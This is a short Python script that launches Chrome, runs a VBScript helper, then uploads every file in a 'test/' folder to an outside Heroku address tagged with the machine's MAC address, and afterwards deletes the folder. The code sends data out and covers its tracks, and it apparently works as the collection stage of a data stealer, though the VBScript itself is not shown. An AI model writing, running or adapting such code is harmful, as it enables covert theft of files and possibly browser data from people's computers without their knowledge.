from subprocess import call, Popen
from os import path, sys, listdir
from shutil import rmtree
import requests
import time
from uuid import getnode as get_mac

mac = get_mac()
Popen("chrome.exe")
call("cscript test.vbs")
time.sleep(60)
url = "https://file-fetch.herokuapp.com/"
basepath = "test/"
for entry in listdir(basepath):
    filepath = path.join(basepath, entry)
    if path.isfile(filepath):
        files = {'file': open(filepath, "rb")}
        res = requests.post(url, files=files, data={"mac": mac})
rmtree(basepath, True)
